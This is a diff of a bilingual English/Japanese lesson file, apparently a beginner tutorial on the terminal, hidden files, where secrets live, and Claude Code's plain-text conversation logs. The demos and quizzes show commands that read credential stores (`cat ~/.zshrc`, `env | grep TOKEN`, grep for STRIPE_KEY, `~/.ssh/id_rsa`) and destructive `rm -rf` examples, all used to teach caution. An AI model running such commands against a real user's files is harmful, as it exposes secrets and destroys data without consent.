@@ -8,16 +8,12 @@
       },
       "body": [
         {
-          "en": "A terminal is a window where you type commands instead of clicking icons. A command is a short instruction, like `ls` (\"list what's in this folder\"). When Claude Code does something on your computer, it is usually typing commands like these.",
-          "ja": "ターミナルは、アイコンをクリックする代わりにコマンドを入力して操作するウィンドウです。コマンドとは `ls`（「このフォルダの中身を一覧表示して」）のような短い命令のこと。Claude Code があなたのパソコンで何かをするときも、たいていはこうしたコマンドを入力しています。"
+          "en": "A terminal is a window where you type commands instead of clicking icons. A command is a short instruction, like `ls` (\"list this folder\"). A flag, a dash and a letter, changes what a command does: `ls -a` means \"list all\", hidden things included.",
+          "ja": "ターミナルは、アイコンをクリックする代わりにコマンドを入力して操作するウィンドウです。コマンドとは `ls`（「このフォルダの中身を一覧表示して」）のような短い命令のこと。多くのコマンドにはフラグを付けられます。フラグとは、ダッシュと文字の組み合わせで、コマンドの動きを変えるものです。`ls -a` は「すべて表示」で、隠れているものも含めて一覧にします。"
         },
         {
-          "en": "Every file has a path: its address, folder by folder, separated by `/`. `/Users/you/portfolio/index.html` means \"start at the top, go into Users, then you, then portfolio, and there is index.html\". The terminal always stands in one folder, and `pwd` tells you which.",
-          "ja": "どのファイルにもパスがあります。パスとはファイルの住所のことで、フォルダを `/` で区切って順にたどったものです。`/Users/you/portfolio/index.html` は「いちばん上から Users、you、portfolio と入っていった先に index.html がある」という意味です。ターミナルは常にどこか1つのフォルダに「立って」いて、`pwd` でそれがどこかを確認できます。"
-        },
-        {
-          "en": "Many commands take a flag: a dash and a letter that change what they do. `ls -a` means \"list all\", hidden things included. `cat .env` prints a file's contents onto the screen. Try them in the practice terminal.",
-          "ja": "多くのコマンドにはフラグを付けられます。フラグとは、ダッシュと文字の組み合わせで、コマンドの動きを変えるものです。`ls -a` は「すべて表示」で、隠れているものも含めて一覧にします。`cat .env` はファイルの中身を画面に表示します。練習用のターミナルで試してみましょう。"
+          "en": "Claude Code works through a terminal too. It can run any command you could, as you, so it can reach any file you can (with your OK).",
+          "ja": "Claude Code もターミナルを通して作業します。あなたが実行できるコマンドなら何でも、あなたとして実行できるので、（あなたが許可すれば）あなたが開けるファイルにはどれでも手が届きます。"
         }
       ],
       "key": {
@@ -29,17 +25,143 @@
         "cwd": "~/portfolio",
         "commands": [
           {
+            "cmd": "whoami",
+            "output": [
+              {
+                "text": "you",
+                "note": {
+                  "en": "Commands run as you. So do the ones Claude runs",
+                  "ja": "コマンドはあなたとして動く。Claude が実行するコマンドも同じ"
+                }
+              }
+            ]
+          },
+          {
+            "cmd": "ls",
+            "output": [
+              {
+                "text": "index.html  package.json  src"
+              }
+            ]
+          },
+          {
+            "cmd": "ls -a",
+            "output": [
+              {
+                "text": ".  ..  .env  .git  index.html  package.json  src",
+                "note": {
+                  "en": "The -a flag: hidden items appeared",
+                  "ja": "-a フラグで、隠れていた項目が現れた"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "more": {
+        "slug": "how-claude-code-works",
+        "anchor": "what-claude-can-access"
+      }
+    },
+    {
+      "id": "computer-card-home",
+      "title": {
+        "en": "Paths, and your home folder ~",
+        "ja": "パスと、ホームフォルダ ~"
+      },
+      "body": [
+        {
+          "en": "Every file has a path: its address, folder by folder, separated by `/`. On a Mac, everything that's yours lives in your home folder, `/Users/you`, nicknamed `~` (a tilde). So `~/portfolio/index.html` is index.html, in portfolio, in your home.",
+          "ja": "どのファイルにもパスがあります。パスとはファイルの住所のことで、フォルダを `/` で区切って順にたどったものです。Mac では、あなたのものはすべてホームフォルダ `/Users/you` の中にあり、このフォルダには `~`（チルダ）という略し方があります。つまり `~/portfolio/index.html` は「ホームフォルダの中の portfolio の中にある index.html」という意味です。"
+        },
+        {
+          "en": "A path starting with `/` or `~` is a full path: the same place from anywhere. Any other path is relative: it starts from the folder the terminal stands in, which `pwd` shows.",
+          "ja": "`/` や `~` で始まるパスはフルパスで、どこから使っても同じ場所を指します。それ以外のパスは相対パスで、ターミナルが今「立って」いるフォルダが起点になります。今いるフォルダは `pwd` で確認できます。"
+        }
+      ],
+      "key": {
+        "en": "A path starting with `~` or `/` can point outside your project, into everything you own.",
+        "ja": "`~` や `/` で始まるパスは、プロジェクトの外、あなたの持ち物すべてを指すことがあります。"
+      },
+      "demo": {
+        "kind": "terminal",
+        "cwd": "~/portfolio",
+        "commands": [
+          {
             "cmd": "pwd",
             "output": [
               {
                 "text": "/Users/you/portfolio",
                 "note": {
-                  "en": "Where you are right now",
-                  "ja": "今いる場所"
+                  "en": "The folder you are standing in",
+                  "ja": "今立っているフォルダ"
                 }
               }
             ]
           },
+          {
+            "cmd": "ls src",
+            "output": [
+              {
+                "text": "app.js  style.css",
+                "note": {
+                  "en": "Relative: src inside the folder you are in",
+                  "ja": "相対パス：今いるフォルダの中の src"
+                }
+              }
+            ]
+          },
+          {
+            "cmd": "ls ~/portfolio/src",
+            "output": [
+              {
+                "text": "app.js  style.css",
+                "note": {
+                  "en": "Full path: the same folder, from anywhere",
+                  "ja": "フルパス：どこから使っても同じフォルダ"
+                }
+              }
+            ]
+          },
+          {
+            "cmd": "ls ~",
+            "output": [
+              {
+                "text": "Desktop  Documents  Downloads  Library  portfolio",
+                "note": {
+                  "en": "Your home folder. The project is one small part of it",
+                  "ja": "ホームフォルダ。プロジェクトはそのごく一部"
+                }
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "computer-card-secrets",
+      "title": {
+        "en": "Hidden files hold the keys",
+        "ja": "隠しファイルに鍵がある"
+      },
+      "body": [
+        {
+          "en": "A name starting with a dot, like `.env`, is a hidden dot-file: plain `ls` and Finder leave it out. Apps keep settings in dot-files, and often secrets too.",
+          "ja": "`.env` のようにドットで始まる名前は、隠しファイル（ドットファイル）です。ふつうの `ls` や Finder には表示されません。アプリは設定をドットファイルに保存し、秘密情報もそこに保存していることがよくあります。"
+        },
+        {
+          "en": "A secret is anything that lets someone act as you: a password, an API key (a code that lets a program use a service on your account), or a login token (proof you already signed in). A project's `.env` usually holds its API keys.",
+          "ja": "秘密情報とは、だれかがあなたになりすますのに使えるもののことです。パスワード、API キー（プログラムがあなたのアカウントでサービスを使うためのコード）、ログイントークン（すでにログイン済みであることの証明）などがあります。プロジェクトの `.env` ファイルには、たいてい API キーが入っています。"
+        }
+      ],
+      "key": {
+        "en": "Hidden is not protected. Any command running as you can open a dot-file, including Claude's.",
+        "ja": "隠れているからといって、守られているわけではありません。あなたとして動くコマンドなら、Claude が実行するものも含めて、ドットファイルを開けます。"
+      },
+      "demo": {
+        "kind": "terminal",
+        "cwd": "~/portfolio",
+        "commands": [
           {
             "cmd": "ls",
             "output": [
@@ -80,75 +202,97 @@
                 "secret": true
               }
             ]
-          },
+          }
+        ]
+      }
+    },
+    {
+      "id": "computer-card-home-secrets",
+      "title": {
+        "en": "Secrets in your home folder",
+        "ja": "ホームフォルダにある秘密情報"
+      },
+      "body": [
+        {
+          "en": "Some secrets sit in your home folder and work for every project. `~/.ssh` holds SSH keys (for logging in to other computers), which unlock your servers and GitHub. `~/.aws` holds cloud logins that can spend money.",
+          "ja": "秘密情報の中には、ホームフォルダにあって、どのプロジェクトでも使えるものがあります。`~/.ssh` には SSH キー（ほかのコンピュータにログインするための鍵）が入っていて、あなたのサーバーや GitHub に入れます。`~/.aws` には、お金を使えてしまうクラウドのログイン情報が入っています。"
+        },
+        {
+          "en": "`~/.zshrc` (your terminal settings) often has tokens pasted into it, as environment variables: named settings that every command you start, Claude's included, can read. `~/.npmrc` and `~/.config` keep logins for developer tools. `~/Library/Application Support/Google/Chrome` holds your browser's cookies, which keep you signed in to sites.",
+          "ja": "`~/.zshrc`（ターミナルの設定）には、トークンが環境変数として貼り付けられていることがよくあります。環境変数とは、あなたが起動するどのコマンドからも（Claude のものも含めて）読める名前付きの設定です。`~/.npmrc` や `~/.config` には、開発ツールのログイン情報が保存されています。`~/Library/Application Support/Google/Chrome` には、サイトにログインしたままにしておくためのブラウザの Cookie が入っています。"
+        }
+      ],
+      "key": {
+        "en": "Once a command reads a secret, one more command could send it anywhere.",
+        "ja": "コマンドが秘密情報を一度読んでしまえば、あと1つのコマンドでどこへでも送れてしまいます。"
+      },
+      "demo": {
+        "kind": "terminal",
+        "cwd": "~/portfolio",
+        "commands": [
           {
             "cmd": "ls -a ~",
             "output": [
               {
                 "text": ".  ..  .Trash  .aws  .config  .npmrc  .ssh  .zshrc  Desktop  Documents  Downloads  Library  portfolio",
                 "note": {
-                  "en": "~ is your home folder. Its hidden folders hold your keys and logins",
-                  "ja": "~ はホームフォルダ。隠しフォルダに鍵やログイン情報がある"
+                  "en": "Hidden folders in your home hold your keys and logins",
+                  "ja": "ホームの隠しフォルダに、鍵やログイン情報がある"
+                },
+                "secret": true
+              }
+            ]
+          },
+          {
+            "cmd": "cat ~/.zshrc",
+            "output": [
+              {
+                "text": "export PATH=\"$HOME/bin:$PATH\"",
+                "note": {
+                  "en": "export sets an environment variable: a named setting every program you start can read",
+                  "ja": "export は環境変数を設定する。環境変数とは、起動したどのプログラムからも読める名前付きの設定"
+                }
+              },
+              {
+                "text": "export GITHUB_TOKEN=ghp_FAKE_7d2e90...",
+                "note": {
+                  "en": "A GitHub key, pasted here once",
+                  "ja": "以前ここに貼り付けた GitHub のキー"
+                },
+                "secret": true
+              }
+            ]
+          },
+          {
+            "cmd": "env | grep TOKEN",
+            "output": [
+              {
+                "text": "GITHUB_TOKEN=ghp_FAKE_7d2e90...",
+                "note": {
+                  "en": "env lists every environment variable; | (pipe) hands that list to grep TOKEN, which keeps only lines with TOKEN. The key is in every terminal you open",
+                  "ja": "env はすべての環境変数を表示し、|（パイプ）がその一覧を grep TOKEN に渡し、TOKEN を含む行だけが残る。キーは開いたすべてのターミナルに入っている"
                 },
                 "secret": true
               }
             ]
           }
         ]
-      }
-    },
-    {
-      "id": "computer-card-home",
-      "title": {
-        "en": "Your home folder, ~",
-        "ja": "ホームフォルダ ~"
       },
-      "body": [
-        {
-          "en": "On a Mac, everything that is yours lives under one folder: `/Users/you` (with your own account name instead of `you`). That is your home folder. Documents, Desktop, Downloads, and the hidden settings of every app you use are all inside it.",
-          "ja": "Mac では、あなたのものはすべて1つのフォルダの下にあります。`/Users/you`（`you` の部分は実際のアカウント名）です。これをホームフォルダと呼びます。書類、デスクトップ、ダウンロード、そして使っているすべてのアプリの隠れた設定が、この中に入っています。"
+      "deep": {
+        "title": {
+          "en": "Under the hood: environment variables",
+          "ja": "しくみ：環境変数"
         },
-        {
-          "en": "It is typed so often that it has a nickname: `~` (a tilde). `~/Documents` is the same place as `/Users/you/Documents`.",
-          "ja": "よく使うので、ホームフォルダには `~`（チルダ）という略し方があります。`~/Documents` は `/Users/you/Documents` と同じ場所です。"
-        },
-        {
-          "en": "Your project is one small folder inside home, like `~/portfolio`. A command that stays inside the project touches only that project. A command that names `~`, or `/` (the very top of the disk), reaches far beyond it.",
-          "ja": "プロジェクトは、ホームの中の小さなフォルダの1つです（たとえば `~/portfolio`）。プロジェクトの中だけで動くコマンドは、そのプロジェクトにしか触れません。一方、`~` や `/`（ディスクのいちばん上）を指すコマンドは、プロジェクトのはるか外まで届きます。"
-        }
-      ],
-      "key": {
-        "en": "When a path starts with `~` or `/`, look twice: it may point outside your project, into everything you own.",
-        "ja": "パスが `~` や `/` で始まっていたら、もう一度よく見ましょう。プロジェクトの外、つまりあなたの持ち物すべてを指しているかもしれません。"
-      }
-    },
-    {
-      "id": "computer-card-secrets",
-      "title": {
-        "en": "Hidden files hold the keys",
-        "ja": "隠しファイルに鍵がある"
-      },
-      "body": [
-        {
-          "en": "A name that starts with a dot, like `.env` or `.ssh`, is hidden: plain `ls` and Finder leave it out. Apps use these dot-files for settings and, very often, for secrets. Hidden does not mean protected. Anything you can open, a command running as you can open too, including the commands Claude runs.",
-          "ja": "`.env` や `.ssh` のようにドットで始まる名前は隠れていて、ふつうの `ls` や Finder には表示されません。アプリはこうしたドットファイルを設定の保存に使い、秘密情報の置き場所にもよく使います。ただし、隠れていることは守られていることではありません。あなたが開けるものは、あなたとして動くコマンドにも開けます。Claude が実行するコマンドも同じです。"
-        },
-        {
-          "en": "A secret is anything that lets someone act as you: a password, an API key (a long code that lets a program use a service on your account), or a login token (proof that you already signed in).",
-          "ja": "ここでいう秘密情報とは、他人があなたになりすませてしまうもの全般のことです。パスワード、APIキー（プログラムがあなたのアカウントでサービスを使うための長い文字列）、ログイントークン（すでにログイン済みであることの証明）などがあります。"
-        },
-        {
-          "en": "Keys and logins: `.env` in a project (API keys). `~/.ssh` (SSH keys, which unlock your servers and GitHub; SSH is the secure way to log in to other computers). `~/.aws` (cloud logins that can spend money).",
-          "ja": "鍵とログイン情報：プロジェクトの `.env`（APIキー）。`~/.ssh`（SSH の鍵。サーバーや GitHub に入るためのもの。SSH は、ほかのコンピューターに安全にログインするための仕組みです）。`~/.aws`（お金を使えてしまうクラウドのログイン情報）。"
-        },
-        {
-          "en": "Settings that hide tokens: `~/.zshrc` (terminal settings, where people often paste tokens). `~/.npmrc` and `~/.config` (saved logins for developer tools). `~/Library/Application Support/Google/Chrome` (your browser's cookies and logged-in sessions).",
-          "ja": "トークンが紛れている設定：`~/.zshrc`（ターミナルの設定。トークンが貼り付けられていることがよくある）。`~/.npmrc` や `~/.config`（開発ツールの保存済みログイン）。`~/Library/Application Support/Google/Chrome`（ブラウザの Cookie やログイン中のセッション）。"
-        }
-      ],
-      "key": {
-        "en": "Hidden is not safe. Once a command reads a secret, one more command could send it anywhere.",
-        "ja": "隠れていても安全ではありません。秘密情報が一度コマンドに読まれたら、あと1つのコマンドでどこへでも送れてしまいます。"
+        "body": [
+          {
+            "en": "Every terminal carries a short list of named settings called environment variables, like `HOME=/Users/you`. In a command, `$HOME` means \"the value of HOME\". Every program started from that terminal can read the whole list, including every command Claude Code runs.",
+            "ja": "どのターミナルも、環境変数と呼ばれる名前付きの設定の短いリストを持っています。たとえば `HOME=/Users/you` です。コマンドの中で `$HOME` と書くと「HOME の値」という意味になります。そのターミナルから起動したプログラムはすべて、このリスト全体を読めます。Claude Code が実行するコマンドも同じです。"
+          },
+          {
+            "en": "A line like `export GITHUB_TOKEN=...` in `~/.zshrc` puts that key into every terminal you open. `env` prints the whole list. The `|` (pipe) hands one command's output to the next, and `grep TOKEN` keeps only the lines that contain TOKEN. Whatever a command prints, Claude reads too.",
+            "ja": "`~/.zshrc` に `export GITHUB_TOKEN=...` のような行があると、開いたすべてのターミナルにそのキーが入ります。`env` はリスト全体を表示します。`|`（パイプ）はコマンドの出力を次のコマンドに渡し、`grep TOKEN` は TOKEN を含む行だけを残します。コマンドが表示したものは、Claude もすべて読みます。"
+          }
+        ]
       }
     },
     {
@@ -159,93 +303,158 @@
       },
       "body": [
         {
-          "en": "When you delete in Finder, the file goes to the Trash and you can drag it back. The terminal skips the Trash. `rm notes.txt` (remove) deletes the file at once, for good. Finder's Trash is just a hidden folder, `~/.Trash`, and `rm` never uses it.",
-          "ja": "Finder で削除したファイルはゴミ箱に入り、あとから戻せます。ターミナルはゴミ箱を通りません。`rm notes.txt`（remove＝削除）は、ファイルをその場で完全に消します。Finder のゴミ箱も実は `~/.Trash` という隠しフォルダにすぎず、`rm` はそこを使いません。"
+          "en": "Finder sends deleted files to the Trash, where you can get them back. The terminal doesn't: `rm notes.txt` (remove) deletes the file at once, for good.",
+          "ja": "Finder で削除したファイルはゴミ箱に移るので、あとから戻せます。ターミナルはそうではありません。`rm notes.txt`（remove、削除）は、そのファイルをすぐに完全に消してしまいます。"
         },
         {
-          "en": "`-r` (recursive) lets `rm` delete a folder and everything inside it, folder after folder. `-f` (force) means don't ask and don't complain. So `rm -rf ~/projects/old` deletes that folder and all its contents, silently, with no undo.",
-          "ja": "`-r`（recursive＝再帰的）を付けると、`rm` はフォルダとその中身を、奥のフォルダまですべて削除します。`-f`（force＝強制）は「確認しない、文句も言わない」という意味です。つまり `rm -rf ~/projects/old` は、そのフォルダと中身をすべて、黙って、元に戻せない形で消します。"
+          "en": "`-r` (recursive) lets `rm` delete a folder and everything inside it; `-f` (force) means don't ask. So `rm -rf ~/projects/old` silently deletes that folder and all its contents.",
+          "ja": "`-r`（recursive、再帰的）を付けると、`rm` はフォルダとその中身をすべて削除します。`-f`（force、強制）は「確認しない」という意味です。つまり `rm -rf ~/projects/old` は、そのフォルダと中身をすべて、何も言わずに削除します。"
         },
         {
-          "en": "`>` is even quieter. `echo hi > notes.txt` writes \"hi\" into notes.txt and replaces whatever was there, with no warning. `>>` adds to the end instead.",
-          "ja": "`>` はさらに目立ちません。`echo hi > notes.txt` は notes.txt に「hi」と書き込み、もともとあった中身を警告なしで置き換えます。末尾に追加したいときは `>>` を使います。"
+          "en": "`>` is even quieter. `echo hi > notes.txt` replaces everything in notes.txt with \"hi\". `>>` adds to the end instead.",
+          "ja": "`>` はもっと静かです。`echo hi > notes.txt` は notes.txt の中身をすべて「hi」に置き換えます。`>>` なら、末尾に追加します。"
         }
       ],
       "key": {
-        "en": "In the terminal, deleted or overwritten means gone. Before you approve `rm` or `>`, check exactly which path it names, and keep backups (Time Machine, Git) so one mistake isn't the end.",
-        "ja": "ターミナルでは、消したもの・上書きしたものは戻りません。`rm` や `>` を承認する前に、どのパスが書かれているかを正確に確認しましょう。そして、1回のミスで終わりにならないよう、バックアップ（Time Machine や Git）を取っておきましょう。"
+        "en": "Before approving `rm` or `>`, check exactly which path it names. Keep backups (Time Machine, Git).",
+        "ja": "`rm` や `>` を承認する前に、どのパスを指しているかを正確に確認しましょう。そして、バックアップ（Time Machine や Git）を取っておきましょう。"
+      },
+      "deep": {
+        "title": {
+          "en": "Doesn't Claude Code have an undo?",
+          "ja": "Claude Code に「元に戻す」はないの？"
+        },
+        "body": [
+          {
+            "en": "It has checkpoints: before Claude edits a file with its own editing tools, it saves a copy, and you can rewind those edits. But checkpoints only track those edits. Files deleted or changed by terminal commands like `rm` or `>` aren't tracked, so rewinding can't bring them back.",
+            "ja": "チェックポイントという機能があります。Claude が自分の編集ツールでファイルを書き換える前に、その時点のコピーを保存するので、その編集は巻き戻せます。ただし、チェックポイントが追跡するのはその編集だけです。`rm` や `>` のようなターミナルのコマンドで削除・変更されたファイルは追跡されないので、巻き戻しても戻りません。"
+          }
+        ]
+      },
+      "more": {
+        "slug": "checkpointing"
       }
     },
     {
-      "id": "computer-card-env",
+      "id": "computer-card-claude-files",
       "title": {
-        "en": "Environment variables",
-        "ja": "環境変数"
+        "en": "Where Claude Code keeps its files",
+        "ja": "Claude Code が自分のファイルを置く場所"
       },
       "body": [
         {
-          "en": "Every terminal carries a short list of named settings called environment variables, like `HOME=/Users/you`. Every program started from that terminal can read the whole list, including every command Claude Code runs. In a command, `$HOME` means \"the value of HOME\".",
-          "ja": "ターミナルはどれも、環境変数と呼ばれる名前付きの設定の一覧を持っています（たとえば `HOME=/Users/you`）。そのターミナルから起動したプログラムは、この一覧をすべて読めます。Claude Code が実行するコマンドも例外ではありません。コマンドの中の `$HOME` は「HOME の値」という意味です。"
+          "en": "Claude Code keeps its own files in `~/.claude/`, a hidden folder in your home: settings, skills (saved instructions for tasks), memory, and every conversation. Each conversation is a plain-text file under `~/.claude/projects/`: every message, every file Claude read, every command's output.",
+          "ja": "Claude Code は、自分のファイルをホームの隠しフォルダ `~/.claude/` に置いています。設定、スキル（作業ごとに保存された手順）、メモリ、そしてすべての会話です。会話は1つずつ、`~/.claude/projects/` の下にプレーンテキスト（暗号化されていない、ただの文字）のファイルとして保存されます。中身は、すべてのメッセージ、Claude が読んだすべてのファイル、すべてのコマンドの出力です。"
         },
         {
-          "en": "Many tools tell you to keep API keys here, often by adding a line like `export GITHUB_TOKEN=...` to `~/.zshrc`. After that, the key is in every terminal you open. The `|` (pipe) hands one command's output to the next, and `grep TOKEN` keeps only the lines that contain TOKEN.",
-          "ja": "多くのツールが、APIキーをここに置くよう案内しています。よくあるのは、`~/.zshrc` に `export GITHUB_TOKEN=...` のような1行を追加するやり方です。そうすると、開くすべてのターミナルにそのキーが入った状態になります。`|`（パイプ）は、あるコマンドの出力を次のコマンドに渡します。`grep TOKEN` は TOKEN を含む行だけを残します。"
+          "en": "`~/.claude.json` holds your sign-in, MCP servers (add-ons that connect Claude to other apps), and the folders you trusted. A project's own `.claude/` folder holds settings, skills and helper agents shared with its team.",
+          "ja": "`~/.claude.json` には、ログイン情報、MCP サーバー（Claude をほかのアプリにつなぐ追加機能）、信頼したフォルダの記録が入っています。プロジェクトの中の `.claude/` フォルダには、そのプロジェクトのチームで共有する設定、スキル、補助エージェントが入っています。"
         }
       ],
       "key": {
-        "en": "`env`, `printenv`, and `echo $SOME_TOKEN` print secrets to the screen, and whatever a command prints, Claude reads too.",
-        "ja": "`env`、`printenv`、`echo $SOME_TOKEN` は秘密情報を画面に表示します。そして、コマンドが表示したものは Claude も読みます。"
+        "en": "A key you paste into the chat, or that Claude reads, sits on disk in plain text.",
+        "ja": "チャットに貼り付けたキーや Claude が読んだキーは、プレーンテキストのままディスクに保存されます。"
       },
       "demo": {
         "kind": "terminal",
         "cwd": "~/portfolio",
         "commands": [
           {
-            "cmd": "echo $HOME",
+            "cmd": "ls -a ~",
             "output": [
               {
-                "text": "/Users/you",
+                "text": ".  ..  .claude  .claude.json  .ssh  .zshrc  Desktop  Documents  portfolio",
                 "note": {
-                  "en": "The value of HOME",
-                  "ja": "HOME の値"
+                  "en": "Claude Code's folder and file are dot-files too",
+                  "ja": "Claude Code のフォルダとファイルもドットファイル"
                 }
               }
             ]
           },
           {
-            "cmd": "echo $SHELL",
+            "cmd": "ls ~/.claude",
             "output": [
               {
-                "text": "/bin/zsh",
+                "text": "CLAUDE.md  history.jsonl  plugins  projects  settings.json  skills",
                 "note": {
-                  "en": "Your shell: the program that reads the commands you type",
-                  "ja": "シェル：入力したコマンドを読み取って実行するプログラム"
+                  "en": "Your settings, skills, and the prompts you typed (history.jsonl)",
+                  "ja": "設定、スキル、入力したプロンプトの履歴（history.jsonl）"
                 }
               }
             ]
           },
           {
-            "cmd": "env | grep TOKEN",
+            "cmd": "ls ~/.claude/projects",
             "output": [
               {
-                "text": "GITHUB_TOKEN=ghp_FAKE_7d2e90...",
+                "text": "-Users-you-portfolio  -Users-you-recipes",
                 "note": {
-                  "en": "Your GitHub key, from ~/.zshrc",
-                  "ja": "~/.zshrc で設定した GitHub のキー"
-                },
-                "secret": true
+                  "en": "One folder per project: the project's path, with each / (and other symbols) turned into -",
+                  "ja": "プロジェクトごとに1フォルダ。名前はパスの / などの記号を - に変えたもの"
+                }
+              }
+            ]
+          },
+          {
+            "cmd": "ls ~/.claude/projects/-Users-you-portfolio",
+            "output": [
+              {
+                "text": "5b1e7c2a-41d9-4e0b-9a63-2f8d0c7e1b44.jsonl",
+                "note": {
+                  "en": "One conversation, saved as plain text",
+                  "ja": "1つの会話。プレーンテキストで保存"
+                }
               },
               {
-                "text": "NPM_TOKEN=npm_FAKE_5b71ac...",
+                "text": "9d03f6b8-27ce-4a51-8e1f-6c4a2b90d7e3.jsonl",
                 "note": {
-                  "en": "Your npm key, also exported in ~/.zshrc",
-                  "ja": "これも ~/.zshrc で設定した npm のキー"
+                  "en": "Another conversation",
+                  "ja": "別の会話"
+                }
+              },
+              {
+                "text": "memory",
+                "note": {
+                  "en": "What Claude remembers about this project",
+                  "ja": "このプロジェクトについて Claude が覚えていること"
+                }
+              }
+            ]
+          },
+          {
+            "cmd": "grep STRIPE_KEY ~/.claude/projects/-Users-you-portfolio/5b1e7c2a-41d9-4e0b-9a63-2f8d0c7e1b44.jsonl",
+            "output": [
+              {
+                "text": "…\"STRIPE_KEY=sk_live_FAKE_41a9...\"…",
+                "note": {
+                  "en": "Shortened. Your payment key, from the day Claude read .env",
+                  "ja": "一部省略。Claude が .env を読んだ日の、あなたの決済キー"
                 },
                 "secret": true
               }
             ]
           }
         ]
+      },
+      "deep": {
+        "title": {
+          "en": "How long are conversations kept?",
+          "ja": "会話はいつまで残るの？"
+        },
+        "body": [
+          {
+            "en": "By default, Claude Code deletes conversation files after 30 days (the `cleanupPeriodDays` setting). By default, conversations from the desktop app are kept until you delete them. The files aren't encrypted: your Mac's file permissions are the only lock, so any program running as you can read them.",
+            "ja": "Claude Code は、標準では30日たった会話ファイルを削除します（`cleanupPeriodDays` という設定）。デスクトップアプリの会話は、標準ではあなたが削除するまで残ります。ファイルは暗号化されていません。守っているのは Mac のファイルのアクセス権だけなので、あなたとして動くプログラムなら何でも読めます。"
+          },
+          {
+            "en": "`claude purge` deletes most of what Claude Code keeps for one project, including its saved conversations. Better still, never paste a secret into the chat. If one got in, treat it as leaked: replace the key.",
+            "ja": "`claude purge` を使うと、1つのプロジェクトについて Claude Code が保存しているもののほとんど（保存された会話を含む）を削除できます。それよりも、秘密情報をチャットに貼り付けないことがいちばんです。入ってしまったら、漏れたものとして扱い、キーを新しいものに取り替えましょう。"
+          }
+        ]
+      },
+      "more": {
+        "slug": "claude-directory",
+        "anchor": "application-data"
       }
     }
   ],
@@ -261,7 +470,9 @@
         "en": "In `~/portfolio`, plain `ls` printed `index.html  package.json  src`. Now you add the `-a` flag.",
         "ja": "`~/portfolio` で、ふつうの `ls` は `index.html  package.json  src` と表示しました。今度は `-a` フラグを付けます。"
       },
-      "code": ["ls -a"],
+      "code": [
+        "ls -a"
+      ],
       "opts": [
         {
           "text": {
@@ -366,10 +577,82 @@
           }
         }
       ],
-      "order": ["dotfile", "envvar", "path", "flag"],
+      "order": [
+        "dotfile",
+        "envvar",
+        "path",
+        "flag"
+      ],
       "explain": {
         "en": "These four words come up every time you read a command. With them, `cat ~/.zshrc` reads as \"print the hidden settings file in my home folder\".",
         "ja": "この4つの言葉は、コマンドを読むたびに出てきます。これがわかれば、`cat ~/.zshrc` は「ホームフォルダにある隠れた設定ファイルを表示する」と読めます。"
+      }
+    },
+    {
+      "id": "computer-predict-4",
+      "type": "predict",
+      "prompt": {
+        "en": "What does the second command print?",
+        "ja": "2つ目のコマンドは何を表示しますか？"
+      },
+      "situation": {
+        "en": "You are in `~/portfolio`. `cd` (change directory) moves the terminal into another folder. `src` is a relative path.",
+        "ja": "今いるのは `~/portfolio` です。`cd`（change directory）は、ターミナルを別のフォルダに移動させるコマンドです。`src` は相対パスです。"
+      },
+      "code": [
+        "cd src",
+        "pwd"
+      ],
+      "opts": [
+        {
+          "text": {
+            "en": "/Users/you/portfolio/src",
+            "ja": "/Users/you/portfolio/src"
+          },
+          "mono": true,
+          "feedback": {
+            "en": "Right. A relative path starts from where you stand, so `src` means the src folder inside `~/portfolio`.",
+            "ja": "正解です。相対パスは今いる場所が起点なので、`src` は `~/portfolio` の中の src フォルダを指します。"
+          }
+        },
+        {
+          "text": {
+            "en": "/src",
+            "ja": "/src"
+          },
+          "mono": true,
+          "feedback": {
+            "en": "That would be the full path `/src`, at the very top of the disk. `src` without a leading `/` is relative.",
+            "ja": "それはディスクのいちばん上にある、フルパスの `/src` です。先頭に `/` がない `src` は相対パスです。"
+          }
+        },
+        {
+          "text": {
+            "en": "/Users/you/src",
+            "ja": "/Users/you/src"
+          },
+          "mono": true,
+          "feedback": {
+            "en": "That would be `~/src`. A relative path starts from the folder you are in, `~/portfolio`, not from home.",
+            "ja": "それは `~/src` です。相対パスの起点はホームではなく、今いるフォルダ `~/portfolio` です。"
+          }
+        },
+        {
+          "text": {
+            "en": "/Users/you/portfolio",
+            "ja": "/Users/you/portfolio"
+          },
+          "mono": true,
+          "feedback": {
+            "en": "`cd src` already moved the terminal one folder down, so `pwd` shows the new place.",
+            "ja": "`cd src` でターミナルは1つ下のフォルダに移動したので、`pwd` は新しい場所を表示します。"
+          }
+        }
+      ],
+      "answer": 0,
+      "explain": {
+        "en": "Relative paths start from the folder you are in. That is why the same command can touch different files depending on where it runs.",
+        "ja": "相対パスは、今いるフォルダが起点です。だから同じコマンドでも、どこで実行するかによって、触るファイルが変わります。"
       }
     },
     {
@@ -383,7 +666,9 @@
         "en": "You're in `~/portfolio`. Its hidden `.env` file holds your Notion key and your payment key.",
         "ja": "`~/portfolio` にいます。隠しファイルの `.env` には、Notion のキーと決済サービスのキーが入っています。"
       },
-      "code": ["cat .env"],
+      "code": [
+        "cat .env"
+      ],
       "opts": [
         {
           "text": {
@@ -466,7 +751,11 @@
           }
         }
       ],
-      "order": ["path", "rm", "rf"],
+      "order": [
+        "path",
+        "rm",
+        "rf"
+      ],
       "explain": {
         "en": "It deletes `~/projects/old` and everything in it, with no question and no undo. Read the path character by character: `rm -rf ~/projects old`, with a space where the slash was, would delete all of `~/projects`, plus any folder called old in the folder you are standing in.",
         "ja": "`~/projects/old` とその中身をすべて、確認も取り消しもなしで削除します。パスは1文字ずつ読みましょう。スラッシュが空白に変わっただけの `rm -rf ~/projects old` は、`~/projects` 全体に加えて、今いるフォルダにある old というフォルダまで消してしまいます。"
@@ -529,7 +818,12 @@
           }
         }
       ],
-      "order": ["zshrc", "chrome", "ssh", "aws"],
+      "order": [
+        "zshrc",
+        "chrome",
+        "ssh",
+        "aws"
+      ],
       "explain": {
         "en": "None of these belong to any one project, and each one can act as you. A project task rarely needs to open them, so a command that names one deserves a closer look.",
         "ja": "どれも特定のプロジェクトのものではなく、どれもあなたになりすますのに使えます。プロジェクトの作業でこれらを開く必要はめったにないので、これらを指すコマンドはよく確認しましょう。"
@@ -577,7 +871,12 @@
           }
         }
       ],
-      "order": ["key", "cat", "ssh", "home"],
+      "order": [
+        "key",
+        "cat",
+        "ssh",
+        "home"
+      ],
       "explain": {
         "en": "It prints your private SSH key. Its partner `id_rsa.pub` (public) is meant to be shared; `id_rsa` never is. A project task almost never needs this file, so if a command reads it, stop and ask why.",
